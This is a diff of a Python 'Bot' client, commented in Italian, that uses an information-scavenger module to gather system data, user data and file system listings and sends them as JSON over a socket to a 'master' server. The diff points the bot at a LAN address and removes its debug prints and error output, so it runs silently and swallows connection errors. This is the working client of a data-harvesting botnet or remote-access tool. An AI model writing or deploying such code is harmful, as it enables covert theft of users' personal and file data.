@@ -11,7 +11,7 @@ import threading
 PORT = 6969
 CLIENT = socket.gethostbyname(socket.gethostname())
 FORMAT = 'utf-8'
-MASTER_ADDRESS = 'localhost'  # Inserire ip del master
+MASTER_ADDRESS = '192.168.1.64'  # Inserire ip del master
 SUCCESSFUL_RESPONSE = 'ok'
 
 
@@ -19,7 +19,6 @@ class Bot:
     def __init__(self):
         self.Scavenger = systemRetrieval.InformationScavanger()
 
-        self.start_time = time.time()
         self.data_sentence = ''
         self.fileSystem_sentence = ''
         self.send_sentence = ''
@@ -59,8 +58,7 @@ class Bot:
         self.sendToServer()
 
         self.clientSocket.close()
-        print("thread_connection terminated.")
-        print("Tempo passato: ", time.time() - self.start_time)
+
 
     def dataScavange(self):
         """
@@ -71,35 +69,27 @@ class Bot:
         self.data_sentence = json.dumps(inputDict)
 
         self.send_sentence = self.data_sentence
-        print("thread_data terminated.")
 
     def userScavenge(self):
         # prende dati user
         self.send_sentence = self.Scavenger.retriveUser()
-        print("user data sent.")
 
     def fileSystemScavange(self):
         inputSentence = self.Scavenger.fileSystemRetrival()
         self.fileSystem_sentence = inputSentence
         self.send_sentence = self.fileSystem_sentence
-        print("thread_fileSystem terminated.")
 
-    def sendToServer(self, data=''):
+    def sendToServer(self):
         """
         Il client invia al server i dati raccolti in formato .json
         :parameter data eventuale dato da inviare, altrimenti invia la send sentence della classe
         :return: None
         """
-        if data == '':
-            send_data = self.send_sentence
-        else:
-            send_data = data
-
+        send_data = self.send_sentence
         try:
-            print(sys.getsizeof(send_data.encode(FORMAT)))
             self.send_message(send_data.encode(FORMAT))
-        except BrokenPipeError as error:
-            print(error)
+        except BrokenPipeError:
+            pass
 
     def send_message(self, msg):
         msg = struct.pack('>I', len(msg)) + msg
